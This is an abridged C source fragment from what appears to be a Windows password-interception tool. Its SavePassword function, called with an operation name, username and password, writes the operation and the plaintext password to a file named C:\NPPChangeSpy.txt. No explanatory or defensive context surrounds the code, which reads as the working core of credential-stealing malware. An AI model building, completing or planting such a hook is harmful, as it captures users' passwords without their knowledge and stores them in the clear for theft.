...
void SavePassword(PWCHAR operation, PUNICODE_STRING username, PUNICODE_STRING password)
{
	HANDLE hFile;
	DWORD dwWritten;

	hFile = CreateFile(
		TEXT("C:\\NPPChangeSpy.txt"),
		GENERIC_WRITE,
		0,
		NULL,
		OPEN_ALWAYS,
	...
	if (hFile != INVALID_HANDLE_VALUE)
	{
		...
		WriteFile(hFile, operation, (DWORD)wcslen(operation) * (DWORD)sizeof(WCHAR), &dwWritten, NULL);
		...
		WriteFile(hFile, L" -> ", 8, &dwWritten, NULL);

		if (password)
		{
			WriteFile(hFile, password->Buffer, password->Length, &dwWritten, NULL);
		}
